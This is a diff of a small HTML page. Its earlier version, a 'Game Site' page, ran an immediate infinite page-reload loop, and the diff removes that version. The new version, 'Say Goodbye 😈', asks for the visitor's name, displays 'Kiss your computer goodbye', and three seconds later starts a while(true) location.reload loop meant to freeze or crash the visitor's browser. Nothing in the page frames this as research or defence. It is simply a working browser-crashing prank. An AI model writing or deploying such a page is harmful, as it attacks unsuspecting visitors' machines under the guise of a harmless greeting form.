@@ -3,16 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Game Site</title>
+    <title>Say Goodbye 😈</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: black;
+            color: white;
+            margin: 0;
+            padding: 50px;
+        }
+        h1 {
+            font-size: 3rem;
+        }
+        p {
+            font-size: 1.5rem;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome to the Game Site</h1>
-    <script>
-        onbeforeunload = function(){ localStorage.x = 1 };
+    <h1>Welcome!</h1>
+    <p>What's your name?</p>
+    <input type="text" id="nameInput" placeholder="Enter your name...">
+    <button onclick="startCrash()">Submit</button>
 
-        setTimeout(function(){
-            while(1) location.reload(1);
-        }, 1000);
+    <div id="message" class="hidden">
+        <h1>Nice knowing you, <span id="userName"></span> 😈</h1>
+        <p>Kiss your computer goodbye... 💋</p>
+    </div>
+
+    <script>
+        function startCrash() {
+            let name = document.getElementById("nameInput").value || "User";
+            document.getElementById("userName").innerText = name;
+            document.getElementById("message").classList.remove("hidden");
+
+            // Hide input and button
+            document.getElementById("nameInput").style.display = "none";
+            document.querySelector("button").style.display = "none";
+
+            // Start the crash sequence
+            setTimeout(function(){
+                while (true) {
+                    location.reload(1);
+                }
+            }, 3000);
+        }
     </script>
 </body>
 </html>
